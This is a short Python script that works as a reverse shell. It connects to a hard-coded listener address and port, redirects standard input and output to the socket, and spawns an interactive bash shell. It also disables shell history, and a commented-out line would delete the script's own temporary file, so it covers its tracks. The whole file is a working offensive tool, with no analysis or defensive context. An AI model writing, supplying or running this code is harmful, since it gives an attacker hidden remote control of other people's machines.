#!/usr/bin/python3
import  os
import pty
import socket
lhost = "192.168.29.200"
lport = 6666
def main():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((lhost, lport))
   os.dup2(s.fileno(), 0)
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   os.putenv("HISTFILE", '/dev/null')
   pty.spawn("/bin/bash")
   # os.remove('/tmp/.t.py')
   s.close()
if __name__ == "__main__":
   main()